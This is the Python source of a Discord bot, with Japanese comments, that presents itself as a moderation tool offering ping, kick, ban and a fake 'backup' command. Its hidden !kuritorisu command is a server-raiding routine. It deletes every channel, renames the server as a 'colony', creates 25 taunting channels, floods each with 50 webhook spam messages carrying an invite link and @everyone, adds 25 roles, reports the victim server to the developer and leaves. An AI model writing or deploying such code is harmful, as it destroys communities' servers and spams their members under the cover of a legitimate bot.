import os
import discord
import datetime
from discord.ext import commands
from dotenv import load_dotenv
load_dotenv()
import asyncio
from discord import app_commands

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

SPAM_MESSAGE = "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  [gif](https://media.discordapp.net/attachments/...)  [gif](https://media.discordapp.net/attachments/...) @everyone"

intents = discord.Intents.all() 

bot = commands.Bot(command_prefix="!", intents=intents)

tree = bot.tree

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"{bot.user} が起動しました！")

@bot.command()
async def kuritorisu(ctx):
    guild = ctx.guild
    channel = ctx.channel
    author = ctx.author

    # Embed（埋め込み）メッセージ作成
    embed = discord.Embed(
        title="📢 !kuritorisu が実行されました",
        color=discord.Color.green()  # 緑色
    )
    embed.add_field(name="サーバー名", value=f"{guild.name} (ID: {guild.id})", inline=False)
    embed.add_field(name="チャンネル", value=f"{channel.name}", inline=False)
    embed.add_field(name="実行者", value=f"{author} (ID: {author.id})", inline=False)

    # オーナーにDM送信
    owner = await bot.fetch_user(OWNER_ID)
    await owner.send(embed=embed)

    # --- 全チャンネルとカテゴリを削除 ---
    async def delete_channel(channel):
        try:
            await channel.delete()
            print(f"削除: {channel.name}")
        except Exception as e:
            print(f"{channel.name} の削除でエラー: {e}")

    delete_tasks = [delete_channel(ch) for ch in guild.channels]
    await asyncio.gather(*delete_tasks)

    # --- サーバー名変更 ---
    try:
        await guild.edit(name="ozeuの植民地")
        print("サーバー名を『ozeuの植民地』に変更しました。")
    except Exception as e:
        print(f"サーバー名の変更でエラー: {e}")

    # --- 新規チャンネル作成 ---
    created_channels = []

    async def create_channel(index):
        try:
            ch = await guild.create_text_channel(name="荒らされてやんのｗ　対策カスやなｗ")
            return ch
        except Exception as e:
            print(f"{index + 1}個目のチャンネル作成失敗: {e}")
            return None

    create_tasks = [create_channel(i) for i in range(25)]
    created_channels = await asyncio.gather(*create_tasks)
    created_channels = [ch for ch in created_channels if ch is not None]

    # --- Webhook送信 ---
    async def send_with_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="ZPlusWebhook")
            for _ in range(50):
                await webhook.send(SPAM_MESSAGE, username="ぜっとぷらす")
        except Exception as e:
            print(f"{channel.name} のWebhook送信でエラー: {e}")

    webhook_tasks = [send_with_webhook(ch) for ch in created_channels]
    await asyncio.gather(*webhook_tasks)

    # --- ロールを25個作成（メッセージ送信のあと）---
    try:
        for i in range(25):
            await guild.create_role(name=f"ぜっとぷらす{i+1}")
            print(f"ロール『ぜっとぷらす』を作成しました（{i + 1}/25）")
    except Exception as e:
        print(f"ロール作成でエラー: {e}")

# ---自動退出---

    await ctx.guild.leave()
    embed = discord.Embed(
            title="🚪 Botがサーバーから退出しました",
            description=f"{ctx.guild.name}（ID: {ctx.guild.id}）",
            color=discord.Color.red()
        )
    # ユーザーID 1007540751573467188 にDMを送信
    try:
        user = await bot.fetch_user(1007540751573467188)
        await user.send(embed=embed)
    except discord.Forbidden:
        print("DMが拒否されているため送信できませんでした。")
    except discord.HTTPException as e:
        print(f"DM送信に失敗しました: {e}")



# /backup コマンド
@bot.tree.command(name="backup", description="ログを保存します")
async def backup(interaction: discord.Interaction):
    await interaction.response.send_message("ログを保存しました☑", ephemeral=False)

# /ping　コマンド
@bot.tree.command(name="ping", description="BOTの応答速度を表示します。")
async def ping(interaction: discord.Interaction):
    latency_ms = round(bot.latency * 1000)
    await interaction.response.send_message(f"応答速度は {latency_ms}ms です")

# /kick コマンド
@bot.tree.command(name="kick", description="指定したユーザーをキックします")
@app_commands.describe(member="キックするメンバー", reason="理由（省略可）")
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
    # 自分より上の権限の人はキックできないようにする
    if member.top_role >= interaction.user.top_role:
        await interaction.response.send_message("❌ 権限の高いユーザーはキックできません。", ephemeral=True)
        return

    try:
        await member.kick(reason=reason)
        await interaction.response.send_message(f"✅ {member.mention} をキックしました。理由: {reason}")
    except Exception as e:
        await interaction.response.send_message(f"❌ キックに失敗しました: {e}", ephemeral=True)

# /ban コマンド
@bot.tree.command(name="ban", description="指定したユーザーをBAN（追放）します")
@app_commands.describe(member="BANするメンバー", reason="理由（省略可）")
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
    if member.top_role >= interaction.user.top_role:
        await interaction.response.send_message("❌ 権限の高いユーザーはBANできません。", ephemeral=True)
        return

    try:
        await member.ban(reason=reason)

        embed = discord.Embed(
            title="⛔ ユーザーをBANしました",
            description=f"{member.mention} をサーバーからBANしました。",
            color=discord.Color.red()
        )
        embed.add_field(name="理由", value=reason, inline=False)

        # BANされたユーザーのアイコンを表示（なければ表示なし）
        if member.avatar:
            embed.set_thumbnail(url=member.avatar.url)

        # 実行者の情報をフッターに表示
        if interaction.user.avatar:
            embed.set_footer(text=f"実行者: {interaction.user}", icon_url=interaction.user.avatar.url)
        else:
            embed.set_footer(text=f"実行者: {interaction.user}")

        await interaction.response.send_message(embed=embed)

    except Exception as e:
        await interaction.response.send_message(f"❌ BANに失敗しました: {e}", ephemeral=True)



    #　ログ

developer_id = 1007540751573467188  
# ---サーバー人数制限---

@bot.event
async def on_guild_join(guild: discord.Guild):
    members = [member async for member in guild.fetch_members()]

    member_count = guild.member_count
    owner_in_guild = any(member.id == OWNER_ID for member in guild.members)

    print(f"Joined guild: {guild.name} with {member_count} members")

    if member_count <= 5 and not owner_in_guild:
        print(f"Leaving guild: {guild.name} because it has {member_count} members and owner not found.")
        await guild.leave()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    inviter = "不明（監査ログの権限が必要）"

    try:
        async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.bot_add):
            if entry.target and entry.target.id == bot.user.id:
                inviter = f"{entry.user}（ID: {entry.user.id}）"
                break
    except discord.Forbidden:
        inviter = "監査ログが取得できません（権限不足）"
    except Exception as e:
        inviter = f"取得失敗: {e}"

    # Embed作成
    embed = discord.Embed(
        title="🔔 新しいサーバーに参加しました",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="📅 日時", value=now, inline=False)
    embed.add_field(name="🌐 サーバー名", value=f"{guild.name}（ID: {guild.id}）", inline=False)
    embed.add_field(name="🙋‍♂️ 追加したユーザー", value=inviter, inline=False)
    embed.add_field(name="👥 サーバー人数", value=f"{guild.member_count}人", inline=False)
    embed.add_field(name="📊 現在のサーバー数", value=f"{len(bot.guilds)}", inline=False)
    embed.set_footer(text="Bot参加通知")

    # DM送信処理
    try:
        user = await bot.fetch_user(developer_id)
        await user.send(embed=embed)
    except Exception as e:
        print(f"DM送信失敗: {e}")

OWNER_ID = 1007540751573467188

#---退出---

@tree.command(name="leave_server", description="指定されたサーバーからBotを退出させます（開発者専用）")
@app_commands.describe(server_id="Botを退出させたいサーバーのID")
async def leave_server(interaction: discord.Interaction, server_id: str):
    # DM以外では使えない
    if interaction.guild is not None:
        await interaction.response.send_message("このコマンドはDMでのみ使えます。", ephemeral=True)
        return

    # オーナー以外は使えない
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("このコマンドを使えるのはBotの開発者だけです。", ephemeral=True)
        return


    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await interaction.response.send_message("Botはそのサーバーに参加していません。", ephemeral=True)
            return

        guild_name = guild.name
        await guild.leave()

        # Embedパネル（赤色）
        embed = discord.Embed(
            title="🚪 Botがサーバーから退出しました",
            description=f"**{guild_name}**（ID: `{server_id}`）から正常に退出しました。",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)

    except ValueError:
        await interaction.response.send_message("サーバーIDは数字で入力してください。", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"エラーが発生しました: {e}", ephemeral=True)

#---server数確認---
@tree.command(name="servers", description="サーバー一覧(開発者専用)")
async def servers(interaction: discord.Interaction):
    # オーナー限定チェック
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
        return

    guilds = bot.guilds
    count = len(guilds)

    # サーバーIDをリストアップ（最大数に注意）
    server_list = "\n".join(f"{guild.name} - ID: `{guild.id}`" for guild in guilds)

    embed = discord.Embed(
        title=f"🤖 Botが入っているサーバー一覧（{count}件）",
        description=server_list if server_list else "現在サーバーに参加していません。",
        color=discord.Color.blue()
    )

    await interaction.response.send_message(embed=embed, ephemeral=True)


        
bot.run(os.getenv("DISCORD_TOKEN"))